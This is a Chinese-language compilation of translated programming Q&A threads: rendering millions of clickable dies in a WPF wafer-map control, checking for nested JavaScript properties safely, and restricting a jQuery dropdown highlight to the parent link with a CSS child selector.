> 时间：2013-03-27T02:33:20.617
> 
> 标签：c#, wpf

我正在为半导体晶片图创建自定义控件![在此处输入图像描述](../Images/b42e6baf373638fca5487b12e37ad47e.png)

这些小矩形中的每一个都需要满足以下要求；1) 显示索引的工具提示 2) 可单击以在晶片图定义中包含或排除。

在 1400 x 1450 裸片的情况下，晶圆图中的裸片数量可能超过 200 万个。

在某些时候，我需要在一个窗口中显示所有模具（大部分点击将在放大视图中发生）。

目前，我正在使用矩形形状分别添加每个模具，并将工具提示的坐标信息（如 (10,10) 的索引）存储为附加属性。

我对每个模具使用不同的样式；取决于模具的某些计算和位置。

```
DieStyle1 = new Style { TargetType = typeof(Rectangle) };
DieStyle1.Setters.Add(new Setter(Shape.FillProperty, Brushes.MediumSlateBlue));
DieStyle1.Setters.Add(new Setter(Shape.StrokeProperty, Brushes.White));
DieStyle1.Setters.Add(new EventSetter(MouseDownEvent, new MouseButtonEventHandler(DieStyle1_MouseDown))); 
```

这种方法很慢并且也使用高内存。所以建议在 WPF 中实现这一目标的更好方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-13T14:13:40.587

在为圣诞树灯创建设计师时，我遇到了同样的问题。当您获得 100 多个项目时，使用 UIElement 或 Shapes 太慢了。处理大量项目的最佳方法是使用双缓冲和您自己管理的图像缓冲区和处理点击的结构。我已经发布了我的项目，应该会给你一个好的开始。可在以下网址获得：http: [//sourceforge.net/projects/xlightsdesigner/](http://sourceforge.net/projects/xlightsdesigner/)

您对 Controls\ChannelitemsCanvas.cs 感兴趣。它可以根据您的需要进行修改，并使用四叉树来存储矩形，以便可以快速确定点击事件。

# javascript - 如何检查属性是否包含属性

> ID：15650997
> 
> 赞同：0
> 
> 时间：2013-03-27T02:33:30.327
> 
> 标签：javascript, properties, conditional-statements

我需要检查一个属性是否包含一个属性，现在我正在使用示例中的 if 语句

这是一个示例对象

```
var Foo = {
    "bar" : 
        {
            "foobar":
                {
                    "barfoo":1
                }
        }
} 
```

我需要检查是否`barfoo`存在，但首先我需要检查所有其他属性是否存在，因为它们可能不取决于是否运行了另一个函数。我也不能真正降低这种结构的水平，所以这不是一个选择。

目前我正在做类似的事情：

```
var d = Foo;
if (d) {
    d = d.bar;
    if (d) {
        d = d.foobar;
        if (d) {
            d = d.barfoo;
            if(d){
                console.log(d);
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-27T02:36:38.487

您可以在一个`if`语句中完成所有操作：

```
if (d && d.bar && d.bar.foobar && d.bar.foobar.barfoo) 
```

这是有效的，因为如果任何元素失败，javascript 将停止检查 if 语句，因此它不会出现类似`cannot check property of undefined`.

否则，您可以使用 try catch 语句：

```
var barfoo;
try{
  barfoo = d.bar.foobar.barfoo
}
catch(e){
  barfoo = null;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T02:38:00.907

你可以只用 - 做一个 if 语句，`&&`它会做短路评估。

```
if (d
    && d.hasOwnProperty('bar')
    && d.bar.hasOwnProperty('foobar')
    && d.bar.foobar.hasOwnProperty('barfoo')
) {
    // fancy things happen
} 
```

您使用的原因`d.hasOwnProperty('bar')`不仅仅是`d.bar`为了防止某些东西污染了对象原型。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-27T02:44:59.880

更强大的解决方案：检查对象的任何深度

```
var Foo = {
    "bar": {
        "foobar": {
            "barfoo": {
                "ddd": 1
            }
        }
    }
};

function checkProps(obj) {
    var ref = obj, arg, i;
    for (i = 1; i < arguments.length; i += 1) {
        arg = arguments[i];
        if(ref.hasOwnProperty(arg)){
            ref = ref[arg]
        } else {
            return false;
        }
    }
    return true;
}
//the function takes the object to search as first parameter and any other properties [,prop1,prop2,...]
console.log(checkProps(Foo, 'bar', 'foobar', 'barfoo', 'ddd')); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T02:40:02.940

如果您只需要知道它是否存在，您可以使用 try/catch 来完成

> 尝试{
> 
> ```
>  if (Foo.bar.foobar.barfoo) {
> 
>       //do stuff with your thingy because you know it exists
> 
>   } 
> ```
> 
> } 捕捉（x）{
> 
> ```
>  //you know it's no good/doesn't exist 
> ```
> 
> }

# jquery - 下拉可见时将类添加到父 li a

> ID：15650999
> 
> 赞同：0
> 
> 时间：2013-03-27T02:33:43.130
> 
> 标签：jquery, dom

有一个愚蠢的问题，只是想在子菜单可见时向 li a 添加一个类。它是级联并将类添加到所有li a，甚至是子菜单中的一个。

```
<ul id="nav">
    <li><a href="#" target="_self">HOME</a></li>
    <li class="dropdown"><a href="#" target="_self">SYSTEM MANAGER<span aria-hidden="true" data-icon="&#xe000;"></span></a>
        <ul>
             <li><a href="#" target="_blank">Link 1</a></li>
        </ul>
    </li>
</ul> 
```

JS

```
$('li.dropdown').on('mouseenter mouseleave', function(e){
        e.preventDefault();
        if (e.type === 'mouseenter')
            $(this).addClass('hilight');
        else
            $(this).removeClass('hilight');
    }); 
```

CSS

```
body header #headerContain nav#nav-wrap ul#nav li.dropdown.hilight a {
  color: #db4105;
} 
```

如何让它仅适用于父 li.dropdown a 而不是级联到子 li a 的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:40:17.897

您应该使用[child-selector](http://www.w3.org/TR/CSS2/selector.html#child-selectors)，只需更改您的 css，

```
body header #headerContain nav#nav-wrap ul#nav li.dropdown.hilight > a {
  color: #db4105;
} 
```